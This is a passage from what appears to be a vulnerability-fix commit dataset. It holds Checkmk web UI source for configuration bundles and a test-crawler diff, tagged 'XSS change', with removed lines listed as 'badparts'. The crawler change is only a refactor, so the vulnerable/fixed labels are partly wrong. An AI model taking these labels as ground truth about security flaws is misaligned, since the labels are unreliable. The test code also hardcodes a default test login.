 def _breadcrumb_url(self) -> str:\n        return self.mode_url(varname=self._name)\n\n    def title(self) -> str:\n        if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS:\n            title = rulespec_registry[self._name].title\n            assert title is not None\n            return title\n        raise MKGeneralException(\"Not implemented bundle group type\")\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        menu = PageMenu(\n            dropdowns=[\n                PageMenuDropdown(\n                    name=\"configurations\",\n                    title=_(\"Configurations\"),\n                    topics=[\n                        PageMenuTopic(\n                            title=_(\"Configurations\"),\n                            entries=[\n                                PageMenuEntry(\n                                    title=_(\"Add configuration\"),\n                                    icon_name=\"new\",\n                                    item=make_simple_link(\n                                        mode_url(\n                                            ModeQuickSetupSpecialAgent.name(), varname=self._name\n                                        )\n                                    ),\n                                    is_shortcut=True,\n                                    is_suggested=True,\n                                )\n                            ],\n                        )\n                    ],\n                )\n            ],\n            breadcrumb=breadcrumb,\n        )\n        return menu\n\n    def page(self) -> None:\n        if not active_config.wato_hide_varnames:\n            display_varname = (\n                '%s[\"%s\"]' % tuple(self._name.split(\":\")) if \":\" in self._name else self._name\n            )\n            html.div(display_varname, class_=\"varname\")\n\n        self._bundles_listing(self._name)\n\n    def _bundles_listing(self, group_name: str) -> None:\n        bundle_ids = set(load_group_bundles(group_name).keys())\n        if not bundle_ids:\n            # TODO (CMK-18347): add redesigned overview for empty configurations\n            html.div(_(\"No configuration yet\"))\n            return\n\n        bundles_with_references = identify_bundle_references(group_name, bundle_ids)\n        if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS:\n            self._special_agent_bundles_listing(group_name, bundles_with_references)\n            return\n\n        raise MKGeneralException(\"Not implemented\")\n\n    def _action_url(self, action: str, bundle_id: BundleId) -> str:\n        vars_: HTTPVariables = [\n            (\"mode\", request.var(\"mode\", self.name())),\n            (self.VAR_NAME, self._name),\n            (self.VAR_BUNDLE_ID, bundle_id),\n            (self.VAR_ACTION, action),\n        ]\n        return make_action_link(vars_)\n\n    def action(self) -> ActionResult:\n        check_csrf_token()\n        if not transactions.check_transaction():\n            return redirect(self.mode_url())\n\n        action = request.get_ascii_input_mandatory(self.VAR_ACTION)\n        bundle_id = BundleId(request.get_ascii_input_mandatory(self.VAR_BUNDLE_ID))\n        if action == \"delete\":\n            delete_config_bundle(bundle_id)\n\n        return redirect(self.mode_url())\n\n    def _special_agent_bundles_listing(\n        self, group_name: str, bundles: Mapping[BundleId, BundleReferences]\n    ) -> None:\n        special_agent_valuespec = rulespec_registry[group_name].valuespec\n        with table_element(\n            table_id=None,\n            title=\"Configurations\",\n            searchable=False,\n            sortable=False,\n            limit=None,\n            foldable=Foldable.FOLDABLE_SAVE_STATE,\n            omit_update_header=True,\n        ) as table:\n            for index, (bundle_id, bundle) in enumerate(sorted(bundles.items())):\n                if not valid_special_agent_bundle(bundle):\n                    raise MKGeneralException(f\"Invalid configuration: {bundle_id}\")\n                assert bundle.rules is not None\n                assert bundle.hosts is not None\n                rule_value = bundle.rules[0].value\n                host_name = bundle.hosts[0].name()\n                table.row()\n\n                table.cell(\"#\", css=[\"narrow nowrap\"])\n                html.write_text_permissive(index + 1)\n\n                self._show_bundle_icons(table, bundle_id)\n\n                table.cell(\"Name\", css=[])\n                html.write_text_permissive(bundle_id)\n\n                table.cell(_(\"Value\"), css=[\"value\"])\n\n                # We use the same table layout for the host name to have the same format as for\n                # the rule rendering\n                html.write_text_permissive(\n                    HTMLWriter.render_table(\n                        HTMLWriter.render_tr(\n                            HTMLWriter.render_td(\"Host name:\", class_=\"title\")\n                            + HTMLWriter.render_td(host_name)\n                        )\n                    )\n                )\n                try:\n                    value_html = special_agent_valuespec.value_to_html(rule_value)\n                except Exception as e:\n                    try:\n                        reason = str(e)\n                        special_agent_valuespec.validate_datatype(rule_value, \"\")\n                    except Exception as e2:\n                        reason = str(e2)\n\n                    value_html = (\n                        html.render_icon(\"alert\")\n                        + HTML.with_escaping(_(\"The value of this rule is not valid. \"))\n                        + escape_to_html_permissive(reason)\n                    )\n                html.write_text_permissive(value_html)\n\n    def _show_bundle_icons(self, table: Table, bundle_id: BundleId) -> None:\n        table.cell(\"\", css=[\"buttons\"])\n        html.empty_icon()\n\n        table.cell(_(\"Actions\"), css=[\"buttons rulebuttons\"])\n        edit_url = \"\"  # TODO: introduce edit button\n        html.icon_button(url=edit_url, title=_(\"Edit this configuration\"), icon=\"edit\")\n\n        html.icon_button(\n            url=make_confirm_delete_link(\n                url=self._action_url(\"delete\", bundle_id),\n                title=_(\"Delete configuration %s\") % bundle_id,\n            ),\n            title=_(\"Delete this configuration\"),\n            icon=\"delete\",\n        )\n\n\nclass MainModuleQuickSetupAWS(ABCMainModule):\n    @property\n    def mode_or_url(self) -> str:\n        return mode_url(ModeEditConfigurationBundles.name(), varname=RuleGroup.SpecialAgents(\"aws\"))\n\n    @property\n    def topic(self) -> MainModuleTopic:\n        return MainModuleTopicQuickSetup\n\n    @property\n    def title(self) -> str:\n        return _(\"Amazon Web Service (AWS)\")\n\n    @property\n    def icon(self) -> Icon:\n        return \"quick_setup_aws\"\n\n    @property\n    def permission(self) -> None | str:\n        return None\n\n    @property\n    def description(self) -> str:\n        return _(\"Configure Amazon Web Service (AWS) monitoring in Checkmk\")\n\n    @property\n    def sort_index(self) -> int:\n        return 10\n\n    @property\n    def is_show_more(self) -> bool:\n        return False\n\n    @classmethod\n    def megamenu_search_terms(cls) -> Sequence[str]:\n        return [\"aws\"]\n\n\nclass EditDCDConnection(Protocol):\n    def __init__(self) -> None: ...\n\n    def from_vars(self, ident_var: str) -> None: ...\n\n    def page(self, form_name: str) -> None: ...\n\n    def action(self) -> ActionResult: ...\n\n\nclass ModeConfigurationBundle(WatoMode):\n    edit_dcd_connection_hook: Callable[[], EditDCDConnection | None] = lambda: None\n\n    @classmethod\n    def name(cls) -> str:\n        return \"edit_configuration_bundle\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return []\n\n    def ensure_permissions(self) -> None:\n        self._ensure_static_permissions()\n        for domain_definition in BUNDLE_DOMAINS.get(self._rule_group_type, []):\n            pname = domain_definition.permission\n            user.need_permission(pname if \".\" in pname else (\"wato.\" + pname))\n\n    def title(self) -> str:\n        return _(\"Edit configuration: %s\") % self._bundle[\"title\"]\n\n    def _from_vars(self) -> None:\n        self._bundle_id = request.get_validated_type_input_mandatory(BundleId, \"bundle_id\")\n        bundle_store = ConfigBundleStore().load_for_reading()\n        if self._bundle_id not in bundle_store:\n            raise MKUserError(\n                \"bundle_id\",\n                _('The configuration \"%s\" does not exist.') % self._bundle_id,\n            )\n        self._bundle: ConfigBundle = bundle_store[self._bundle_id]\n        self._bundle_group = self._bundle[\"group\"]\n        self._bundle_references = identify_bundle_references(self._bundle_group, {self._bundle_id})[\n            self._bundle_id\n        ]\n\n        self._rule_group_type = RuleGroupType(self._bundle_group.split(\":\")[0])\n        match self._rule_group_type:\n            case RuleGroupType.SPECIAL_AGENTS:\n                self._special_agents_from_vars()\n            case _:\n                raise MKUserError(\n                    None,\n                    _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                    % self._bundle_group,\n                )\n\n    def _special_agents_from_vars(self) -> None:\n        if not all(\n            [\n                self._bundle_references.rules,\n                self._bundle_references.hosts,\n                self._bundle_references.passwords,\n            ]\n        ):\n            raise MKUserError(\n                None,\n                _(\"The configuration bundle does not contain all required objects.\"),\n            )\n\n        assert self._bundle_references.rules\n        assert len(self._bundle_references.rules) == 1\n        assert self._bundle_references.hosts\n        assert len(self._bundle_references.hosts) == 1\n        assert self._bundle_references.passwords\n\n        # Rule\n        ModeEditRule.set_vars(self._bundle_group, self._bundle_references.rules[0].id)\n        self._edit_rule = ModeEditRule()\n\n        # Host\n        ModeEditHost.set_vars(self._bundle_references.hosts[0].name())\n        self._edit_host = ModeEditHost()\n\n        # DCD connections\n        self._edit_dcd_connections: Sequence[EditDCDConnection | None] = []\n        if self._bundle_references.dcd_connections:\n            for index, dcd_connection in enumerate(self._bundle_references.dcd_connections):\n                request.set_var(f\"dcd_id_{index}\", dcd_connection[0])\n\n            self._edit_dcd_connections = [\n                self.edit_dcd_connection_hook() for _dcd in self._bundle_references.dcd_connections\n            ]\n            for index, edit_dcd_connection in enumerate(self._edit_dcd_connections):\n                if edit_dcd_connection:\n                    edit_dcd_connection.from_vars(f\"dcd_id_{index}\")\n\n        # Passwords\n        for index, password in enumerate(self._bundle_references.passwords):\n            request.set_var(f\"password_id_{index}\", password[0])\n        self._edit_passwords = [ModeEditPassword() for _pw in self._bundle_references.passwords]\n        for index, edit_password in enumerate(self._edit_passwords):\n            edit_password.from_vars(f\"password_id_{index}\")\n\n    @staticmethod\n    def _configuration_vs(bundle_id: str) -> Dictionary:\n        elements: Sequence[DictionaryEntry] = [\n            (\"_name\", TextInput(title=_(\"Name\"), size=80)),\n            (\"_comment\", RuleComment()),\n            (\"_bundle_id\", FixedValue(title=_(\"Configuration bundle ID\"), value=bundle_id)),\n        ]\n        return Dictionary(\n            title=_(\"Configuration bundle properties\"),\n            optional_keys=False,\n            render=\"form\",\n            elements=elements,\n        )\n\n    def _sub_page_configuration(self) -> None:\n        html.h1(_(\"Configuration\"), class_=[\"edit_configuration_bundle_header\"])\n        with html.form_context(\"edit_bundle\", method=\"POST\"):\n            self._configuration_vs(self._bundle_id).render_input(\n                \"options\",\n                {\n                    \"_name\": self._bundle[\"title\"],\n                    \"_comment\": self._bundle[\"comment\"],\n                },\n            )\n            forms.end()\n            html.hidden_fields()\n\n    def _sub_page_rule(self) -> None:\n        html.h1(_(\"Rule\"), class_=[\"edit_configuration_bundle_header\"])\n        self._edit_rule.page()\n\n    def _sub_page_host(self) -> None:\n        html.h1(_(\"Host\"), class_=[\"edit_configuration_bundle_header\"])\n        self._edit_host.page()\n\n    def _sub_page_dcd_connection(self) -> None:\n        if any(edit_dcd_connection for edit_dcd_connection in self._edit_dcd_connections):\n            html.h1(_(\"Dynamic host management\"), class_=[\"edit_configuration_bundle_header\"])\n            for index, edit_dcd_connection in enumerate(self._edit_dcd_connections):\n                if edit_dcd_connection:\n                    edit_dcd_connection.page(f\"edit_dcd_{index}\")\n\n    def _sub_page_password(self) -> None:\n        if self._edit_passwords:\n            html.h1(_(\"Password\"), class_=[\"edit_configuration_bundle_header\"])\n            for index, edit_password in enumerate(self._edit_passwords):\n                edit_password.page(f\"edit_password_{index}\")\n\n    def page(self) -> None:\n        with html.form_context(\"bulk\", method=\"POST\"):\n            forms.end()\n            html.hidden_fields()\n        match self._rule_group_type:\n            case RuleGroupType.SPECIAL_AGENTS:\n                self._sub_page_configuration()\n                self._sub_page_rule()\n                self._sub_page_host()\n                self._sub_page_dcd_connection()\n                self._sub_page_password()\n            case _:\n                raise MKUserError(\n                    None,\n                    _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                    % self._bundle_group,\n                )\n\n    def _form_names(self) -> Iterator[str]:\n        yield \"edit_bundle\"\n        if self._edit_rule:\n            yield \"rule_editor\"\n        if self._edit_host:\n            yield \"edit_host\"\n        yield from (f\"edit_dcd_{index}\" for index in range(len(self._edit_dcd_connections)))\n        yield from (f\"edit_password_{index}\" for index in range(len(self._edit_passwords)))\n\n    def _page_menu_action_entries(self) -> Iterator[PageMenuEntry]:\n        form_names = list(self._form_names())\n        yield PageMenuEntry(\n            title=_(\"Save\"),\n            icon_name=\"services\",\n            item=make_form_bulk_submit_link(\n                bulk_form_name=\"bulk\", form_names=form_names, button_name=\"_save\"\n            ),\n            is_shortcut=False,\n        )\n        yield PageMenuEntry(\n            title=_(\"Save & go to service discovery\"),\n            icon_name=\"services_green\",\n            item=make_form_bulk_submit_link(\n                bulk_form_name=\"bulk\",\n                form_names=form_names,\n                button_name=\"_save_and_go_to_service_discovery\",\n            ),\n            is_shortcut=True,\n        )\n        yield PageMenuEntry(\n            title=_(\"Cancel\"),\n            icon_name=\"cancel\",\n            item=make_simple_link(\"\"),\n            is_shortcut=True,\n        )\n\n    def _page_menu_related_entries(self) -> Iterator[PageMenuEntry]:\n        yield PageMenuEntry(\n            title=_(\"TBD\"),\n            icon_name=\"\",\n            item=make_simple_link(\"\"),\n        )\n\n    def action(self) -> ActionResult:\n        check_csrf_token()\n        if not transactions.check_transaction():\n            return redirect(self.mode_url(bundle_id=self._bundle_id))\n\n        if request.has_var(\"_save\"):\n            self._action_save()\n            return redirect(self.mode_url(bundle_id=self._bundle_id))\n\n        if request.has_var(\"_save_and_go_to_service_discovery\"):\n            self._action_save()\n            host = self._edit_host.host\n            folder = folder_from_request(request.var(\"folder\"), host.name())\n            return redirect(mode_url(\"inventory\", folder=folder.path(), host=host.name()))\n\n        return redirect(self.mode_url(bundle_id=self._bundle_id))\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        return PageMenu(\n            dropdowns=[\n                PageMenuDropdown(\n                    name=\"actions\",\n                    title=_(\"Configuration\"),\n                    topics=[\n                        PageMenuTopic(\n                            title=_(\"Actions\"),\n                            entries=list(self._page_menu_action_entries()),\n                        ),\n                    ],\n                ),\n                PageMenuDropdown(\n                    name=\"actions\",\n                    title=_(\"Related\"),\n                    topics=[\n                        PageMenuTopic(\n                            title=_(\"Related\"),\n                            entries=list(self._page_menu_related_entries()),\n                        ),\n                    ],\n                ),\n            ],\n            breadcrumb=breadcrumb,\n        )\n\n    def _save_config_bundle_configuration(self) -> None:\n        vs = self._configuration_vs(self._bundle_id)\n        config = vs.from_html_vars(\"edit_bundle_options\")\n        vs.validate_value(config, \"edit_bundle_options\")\n        self._bundle[\"title\"] = config[\"_name\"]\n        self._bundle[\"comment\"] = config[\"_comment\"]\n        edit_config_bundle_configuration(self._bundle_id, self._bundle)\n\n    def _set_vars(self, all_vars: Mapping[str, Sequence[tuple[str, str]]], form_name: str) -> None:\n        request.del_vars()\n        for var in all_vars[form_name]:\n            request.set_var(var[0].replace(form_name + \"_\", \"\"), var[1])\n        request.set_var(\"_transid\", transactions.fresh_transid())\n        transactions.store_new()\n\n    def _action_save(self) -> None:\n        all_vars = {\n            form_name: list(request.itervars(form_name)) for form_name in self._form_names()\n        }\n        self._save_config_bundle_configuration()\n        if self._edit_host:\n            self._set_vars(all_vars, \"edit_host\")\n            self._edit_host.action()\n        if self._edit_rule:\n            self._set_vars(all_vars, \"rule_editor\")\n            self._edit_rule.action()\n        if self._edit_passwords:\n            for index, edit_password in enumerate(self._edit_passwords):\n                self._set_vars(all_vars, f\"edit_password_{index}\")\n                edit_password.action()\n        if self._edit_dcd_connections:\n            for index, edit_dcd_connection in enumerate(self._edit_dcd_connections):\n                if edit_dcd_connection:\n                    self._set_vars(all_vars, f\"edit_dcd_connection_{index}\")\n                    edit_dcd_connection.action()\n"
                }
            },
            "msg": "Fix XSS crawl attempt no. 2\n\nChange-Id: Ia5254916077120b8544a8446b694ce439fe57128"
        },
        "b011e701bed85980b2ca9635f5aa55df6a917010": {
            "url": "https://api.github.com/repos/Checkmk/checkmk/commits/b011e701bed85980b2ca9635f5aa55df6a917010",
            "html_url": "https://github.com/Checkmk/checkmk/commit/b011e701bed85980b2ca9635f5aa55df6a917010",
            "sha": "b011e701bed85980b2ca9635f5aa55df6a917010",
            "keyword": "XSS change",
            "diff": "diff --git a/tests/testlib/crawler.py b/tests/testlib/crawler.py\nindex 8e1e1ef6893..e6ba362a67e 100644\n--- a/tests/testlib/crawler.py\n+++ b/tests/testlib/crawler.py\n@@ -193,6 +193,7 @@ async def crawl(self, max_tasks: int) -> None:\n                     name=cookie_dict[\"name\"],\n                     value=cookie_dict[\"value\"],\n                 )\n+            browser_context = await browser.new_context(storage_state=storage_state)\n             # special-case\n             search_limited_urls: bool = self._max_urls > 0\n             if search_limited_urls and self._max_urls < max_tasks:\n@@ -207,7 +208,7 @@ async def crawl(self, max_tasks: int) -> None:\n                         url = None\n                     if url and len(tasks) < max_tasks:\n                         logger.debug(\"Checking URL %s\", url.url)\n-                        tasks.add(asyncio.create_task(self.visit_url(browser, storage_state, url)))\n+                        tasks.add(asyncio.create_task(self.visit_url(browser_context, url)))\n                     else:\n                         logger.debug(\n                             \"Maximum tasks assgined. Waiting for tasks to be completed ...\"\n@@ -355,8 +356,7 @@ def handle_crash_report(self, url: Url, crash_id: str) -> bool:\n \n     async def visit_url(\n         self,\n-        browser: playwright.async_api.Browser,\n-        storage_state: playwright.async_api.StorageState,\n+        browser_context: playwright.async_api.BrowserContext,\n         url: Url,\n     ) -> bool:\n         start = time.time()\n@@ -364,7 +364,7 @@ async def visit_url(\n         content_type = self.requests_session.head(url.url).headers[\"content-type\"]\n         if content_type.startswith(\"text/html\"):\n             try:\n-                page_content = await self.get_page_content(browser, storage_state, url)\n+                page_content = await self.get_page_content(browser_context, url)\n                 await self.validate(url, page_content.content, page_content.logs)\n             except playwright.async_api.Error as e:\n                 self.handle_error(url, \"BrowserError\", repr(e))\n@@ -381,8 +381,7 @@ async def visit_url(\n \n     @staticmethod\n     async def get_page_content(\n-        browser: playwright.async_api.Browser,\n-        storage_state: playwright.async_api.StorageState,\n+        browser_context: playwright.async_api.BrowserContext,\n         url: Url,\n     ) -> PageContent:\n         logs = []\n@@ -396,7 +395,7 @@ async def handle_console_messages(msg: playwright.async_api.ConsoleMessage) -> N\n         async def handle_page_error(error: playwright.async_api.Error) -> None:\n             logs.append(format_js_error(error))\n \n-        page = await browser.new_page(storage_state=storage_state)\n+        page = await browser_context.new_page()\n         page.on(\"pageerror\", handle_page_error)\n         page.on(\"console\", handle_console_messages)\n         try:\n",
            "message": "",
            "files": {
                "/tests/testlib/crawler.py": {
                    "changes": [
                        {
                            "diff": "\n                         url = None\n                     if url and len(tasks) < max_tasks:\n                         logger.debug(\"Checking URL %s\", url.url)\n-                        tasks.add(asyncio.create_task(self.visit_url(browser, storage_state, url)))\n+                        tasks.add(asyncio.create_task(self.visit_url(browser_context, url)))\n                     else:\n                         logger.debug(\n                             \"Maximum tasks assgined. Waiting for tasks to be completed ...\"\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "                        tasks.add(asyncio.create_task(self.visit_url(browser, storage_state, url)))"
                            ],
                            "goodparts": [
                                "                        tasks.add(asyncio.create_task(self.visit_url(browser_context, url)))"
                            ]
                        },
                        {
                            "diff": "\n \n     async def visit_url(\n         self,\n-        browser: playwright.async_api.Browser,\n-        storage_state: playwright.async_api.StorageState,\n+        browser_context: playwright.async_api.BrowserContext,\n         url: Url,\n     ) -> bool:\n         start = time.time()\n",
                            "add": 1,
                            "remove": 2,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "        browser: playwright.async_api.Browser,",
                                "        storage_state: playwright.async_api.StorageState,"
                            ],
                            "goodparts": [
                                "        browser_context: playwright.async_api.BrowserContext,"
                            ]
                        },
                        {
                            "diff": "\n         content_type = self.requests_session.head(url.url).headers[\"content-type\"]\n         if content_type.startswith(\"text/html\"):\n             try:\n-                page_content = await self.get_page_content(browser, storage_state, url)\n+                page_content = await self.get_page_content(browser_context, url)\n                 await self.validate(url, page_content.content, page_content.logs)\n             except playwright.async_api.Error as e:\n                 self.handle_error(url, \"BrowserError\", repr(e))\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "                page_content = await self.get_page_content(browser, storage_state, url)"
                            ],
                            "goodparts": [
                                "                page_content = await self.get_page_content(browser_context, url)"
                            ]
                        },
                        {
                            "diff": "\n \n     @staticmethod\n     async def get_page_content(\n-        browser: playwright.async_api.Browser,\n-        storage_state: playwright.async_api.StorageState,\n+        browser_context: playwright.async_api.BrowserContext,\n         url: Url,\n     ) -> PageContent:\n         logs = []\n",
                            "add": 1,
                            "remove": 2,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "        browser: playwright.async_api.Browser,",
                                "        storage_state: playwright.async_api.StorageState,"
                            ],
                            "goodparts": [
                                "        browser_context: playwright.async_api.BrowserContext,"
                            ]
                        },
                        {
                            "diff": "\n         async def handle_page_error(error: playwright.async_api.Error) -> None:\n             logs.append(format_js_error(error))\n \n-        page = await browser.new_page(storage_state=storage_state)\n+        page = await browser_context.new_page()\n         page.on(\"pageerror\", handle_page_error)\n         page.on(\"console\", handle_console_messages)\n         try:\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "        page = await browser.new_page(storage_state=storage_state)"
                            ],
                            "goodparts": [
                                "        page = await browser_context.new_page()"
                            ]
                        }
                    ],
                    "source": "\n import asyncio import io import json import logging import os import re import tarfile import time from collections import deque from collections.abc import Generator, Iterable, MutableSequence from dataclasses import dataclass, field from itertools import chain from pathlib import Path from types import TracebackType from typing import NamedTuple from urllib.parse import parse_qs, parse_qsl, urlencode, urljoin, urlparse, urlsplit, urlunsplit import playwright.async_api import requests import requests.utils from bs4 import BeautifulSoup from lxml import etree from playwright.async_api import async_playwright from tests.testlib.site import Site logger=logging.getLogger() CrashIdRegex=r\"\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}\" CrashLinkRegex=rf\"crash\\.py\\?crash_id=({CrashIdRegex})\" class PageContent(NamedTuple): content: str logs: Iterable[str] class Progress: def __init__(self, report_interval: float=10) -> None: self.started=time.time() self.done_total=0 self.report_interval=report_interval self.next_report=0.0 def __enter__(self) -> \"Progress\": self.started=time.time() self.next_report=self.started +self.report_interval self.done_total=0 return self def __exit__( self, exc_type: type[BaseException] | None, exc_val: BaseException | None, exc_tb: TracebackType | None, ) -> None: logger.info( \"%d done in %.3f secs %s\", self.done_total, self.duration, \"\" if exc_type is None else f\"(canceled with{exc_type})\", ) @property def duration(self) -> float: return time.time() -self.started def done(self, done: int) -> None: self.done_total +=done if time.time() > self.next_report: logger.info( \"rate: %.2f per sec(%d total)\", self.done_total / self.duration, self.done_total ) self.next_report=time.time() +self.report_interval class InvalidUrl(Exception): def __init__(self, url: str, message: str) -> None: super().__init__(url, message) self.url=url self.message=message class Url: def __init__( self, url: str, orig_url: str | None=None, referer_url: str | None=None, follow: bool=True, ) -> None: self.url=url self.orig_url=orig_url self.referer_url=referer_url self.follow=follow def __hash__(self) -> int: return hash(self.url) def neutral_url(self) -> str: return \"check_mk/\" +self.url.split(\"/check_mk/\", 1)[1] def url_without_host(self) -> str: parsed=list(urlsplit(self.url)) parsed[0]=\"\" parsed[1]=\"\" return urlunsplit(parsed) @dataclass class ErrorResult: message: str referer_url: str | None=None @dataclass class CrawlSkipInfo: reason: str message: str @dataclass class CrawlResult: duration: float=0.0 skipped: CrawlSkipInfo | None=None errors: MutableSequence[ErrorResult]=field(default_factory=list) def format_js_error(error: playwright.async_api.Error) -> str: return f\"{error.name}:{error.message}\\n{error.stack}\" def try_find_frame_named_main(page: playwright.async_api.Page) -> playwright.async_api.Frame: for frame in page.frames: if frame.name==\"main\": return frame return page.main_frame class Crawler: def __init__(self, test_site: Site, report_file: str | None, max_urls: int=0) -> None: self.duration=0.0 self.results: dict[str, CrawlResult]={} self.site=test_site self.report_file=Path(report_file or self.site.result_dir()) / \"crawl.xml\" self.requests_session=requests.Session() self._find_more_urls: bool=True self._ignored_content_types: set[str]={ \"application/json\", \"application/pdf\", \"application/x-deb\", \"application/x-debian-package\", \"application/x-gzip\", \"application/x-mkp\", \"application/x-msdos-program\", \"application/x-msi\", \"application/x-pkg\", \"application/x-redhat-package-manager\", \"application/x-rpm\", \"application/x-tar\", \"application/x-tgz\", \"application/x-yaml; charset=utf-8\", \"image/gif\", \"image/png\", \"image/svg+xml\", \"text/x-c++src\", \"text/x-chdr\", \"text/x-sh\", } self._max_urls=max(0, max_urls) self._todos=deque([Url(self.site.internal_url)]) async def crawl(self, max_tasks: int) -> None: async with async_playwright() as pw: browser=await pw.chromium.launch() storage_state=await self.access_storage_state(browser) for cookie_dict in storage_state[\"cookies\"]: self.requests_session.cookies.set( name=cookie_dict[\"name\"], value=cookie_dict[\"value\"], ) search_limited_urls: bool=self._max_urls > 0 if search_limited_urls and self._max_urls < max_tasks: max_tasks=self._max_urls with Progress() as progress: tasks: set=set() while tasks or self._todos and self._find_more_urls: try: url=self._todos.popleft() except IndexError: logger.debug(\"Populating URLs/TODOs...\") url=None if url and len(tasks) < max_tasks: logger.debug(\"Checking URL %s\", url.url) tasks.add(asyncio.create_task(self.visit_url(browser, storage_state, url))) else: logger.debug( \"Maximum tasks assgined. Waiting for tasks to be completed...\" ) done, tasks=await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED) progress.done(done=sum(1 for t in done if t.result())) if search_limited_urls: self._find_more_urls=progress.done_total < self._max_urls self.duration=progress.duration await browser.close() async def access_storage_state( self, browser: playwright.async_api.Browser ) -> playwright.async_api.StorageState: context=await browser.new_context() page=await context.new_page() async def handle_page_error(error: playwright.async_api.Error) -> None: self.handle_error( Url(try_find_frame_named_main(page).url), error_type=\"JavascriptCreateError\", message=format_js_error(error), ) page.on(\"pageerror\", handle_page_error) await page.goto(self.site.internal_url) await page.fill('input[name=\"_username\"]', \"cmkadmin\") await page.fill('input[name=\"_password\"]', \"cmk\") async with page.expect_navigation(): await page.click(\"text=Login\") await page.close() storage_state=await context.storage_state() await context.close() return storage_state def _ensure_result(self, url: Url) -> None: if url.url not in self.results: self.results[url.url]=CrawlResult() def handle_error(self, url: Url, error_type: str, message: str=\"\") -> bool: self._ensure_result(url) self.results[url.url].errors.append( ErrorResult(referer_url=url.referer_url, message=f\"{error_type}:{message}\") ) logger.error(\"page error: %s: %s,(%s)\", error_type, message, url.url) return True def handle_new_reference(self, url: Url, referer_url: Url) -> bool: if referer_url.follow and url.url not in self.results: self.results[url.url]=CrawlResult() self._todos.append(url) return True return False def handle_skipped_reference(self, url: Url, reason: str, message: str) -> None: self._ensure_result(url) if self.results[url.url].skipped is None: self.results[url.url].skipped=CrawlSkipInfo( reason=reason, message=message, ) def handle_page_done(self, url: Url, duration: float) -> bool: self._ensure_result(url) self.results[url.url].duration=duration logger.info(\"page done in %.2f secs(%s)\", duration, url.url) return self.results[url.url].skipped is None and len(self.results[url.url].errors)==0 def handle_crash_reports(self) -> None: crash_reports_url=urljoin(self.site.internal_url, \"view.py?view_name=crash_reports\") try: response=self.requests_session.get(crash_reports_url) except requests.RequestException as exception: self.handle_error(Url(url=crash_reports_url), \"GetCrashReportsFailed\", str(exception)) return if response.status_code !=200: self.handle_error( Url(url=crash_reports_url), \"CrashReportsPageFailed\", str(response.status_code) ) for crash_id_match in re.finditer(rf\"crash_id=({CrashIdRegex})\", response.text): self.handle_crash_report(Url(\"unknown url\"), crash_id_match.group(1)) def handle_crash_report(self, url: Url, crash_id: str) -> bool: crash_report_url=urljoin( self.site.internal_url, f\"download_crash_report.py?crash_id={crash_id}&site={self.site.id}\", ) try: response=self.requests_session.get(crash_report_url) except requests.RequestException as exception: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"CrashReportDownloadFailed\", str(exception), ) return False status_code=response.status_code expected_status_code=200 if status_code !=expected_status_code: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"CrashReportDownloadFailed\", f\"status code:{status_code}, expected:{expected_status_code}\", ) return False content_type=response.headers.get(\"content-type\") expected_content_type=\"application/x-tgz\" if content_type !=expected_content_type: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"CrashReportDownloadFailed\", f\"content-type:{content_type}, expected:{expected_content_type}\", ) return False try: with tarfile.open(fileobj=io.BytesIO(response.content)) as tar: crash_info_file=tar.extractfile(\"crash.info\") if crash_info_file is None: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"EmptyCrashReportTarFile\", message=crash_id, ) return False crash_info=json.loads(crash_info_file.read().decode(\"utf-8\")) except tarfile.ReadError: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"InvalidCrashReportTarFile\", repr(response.content), ) return False crash_report=json.dumps(crash_info, indent=4) return self.handle_error(url, \"CrashReport\", message=crash_report) async def visit_url( self, browser: playwright.async_api.Browser, storage_state: playwright.async_api.StorageState, url: Url, ) -> bool: start=time.time() content_type=self.requests_session.head(url.url).headers[\"content-type\"] if content_type.startswith(\"text/html\"): try: page_content=await self.get_page_content(browser, storage_state, url) await self.validate(url, page_content.content, page_content.logs) except playwright.async_api.Error as e: self.handle_error(url, \"BrowserError\", repr(e)) elif any( content_type.startswith(ignored_start) for ignored_start in[\"text/plain\", \"text/csv\"] ): self.handle_skipped_reference(url, reason=\"content-type\", message=content_type) elif content_type in self._ignored_content_types: self.handle_skipped_reference(url, reason=\"content-type\", message=content_type) else: self.handle_error(url, error_type=\"UnknownContentType\", message=content_type) return self.handle_page_done(url, duration=time.time() -start) @staticmethod async def get_page_content( browser: playwright.async_api.Browser, storage_state: playwright.async_api.StorageState, url: Url, ) -> PageContent: logs=[] async def handle_console_messages(msg: playwright.async_api.ConsoleMessage) -> None: location=( f\"{msg.location['url']}:{msg.location['lineNumber']}:{msg.location['columnNumber']}\" ) logs.append(f\"{msg.type}:{msg.text}({location})\") async def handle_page_error(error: playwright.async_api.Error) -> None: logs.append(format_js_error(error)) page=await browser.new_page(storage_state=storage_state) page.on(\"pageerror\", handle_page_error) page.on(\"console\", handle_console_messages) try: await page.goto(url.url, timeout=60 * 1000) return PageContent(content=await page.content(), logs=logs) finally: await page.close() async def validate(self, url: Url, text: str, logs: Iterable[str]) -> None: def blocking() -> None: soup=BeautifulSoup(text, \"lxml\") self.check_content(url, soup) self.check_links(url, soup) self.check_frames(url, soup) self.check_iframes(url, soup) self.check_logs(url, logs) loop=asyncio.get_running_loop() await loop.run_in_executor(None, blocking) def check_content(self, url: Url, soup: BeautifulSoup) -> None: if soup.find(\"div\", id=\"login\") is not None: self.handle_error(url, \"LoginError\", \"login 